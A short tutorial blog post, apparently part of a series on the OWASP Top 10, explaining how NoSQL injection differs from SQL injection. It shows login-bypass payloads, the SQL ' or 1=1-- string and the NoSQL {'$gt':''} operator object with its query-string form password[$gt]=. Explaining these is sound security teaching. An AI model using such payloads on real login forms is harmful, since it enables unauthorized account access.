---
title: "Nosqli"
date: 2022-08-12T23:31:50-04:00
description: "Still thinking about mysql, old man?"
tags: [sqli]
featured_image: "images/nosqli.png"
# images is optional, but needed for showing Twitter Card
images: []
categories: OWASP TOP10
comment: true
draft: false
---
# No! It's SQLi!

## Difference

- In http requests

```bash
# sql
username=admin&password=password
# nosql
{
	"username":"admin",
	"password":"password"
}
```

- A simple payload

```bash
# sql
username=admin&password=1'+or+1=1--+
# nosql
# {"$gt":""} will return TRUE because everything is greater than NULL
# which will make the request return ture and log in as admin
{
	"username":"admin",
	"password":{"$gt":""}
}
# nosql
# qs moudle in Nodejs could automatically convert request parameter to JSON object.
# This is what request looks likes
username=admin&password[$gt]=&submit=login
# This is what Nodejs see, same as the example above.
{
	"username":"admin",
	"password":{"$gt":""}
}
```

## To be continued
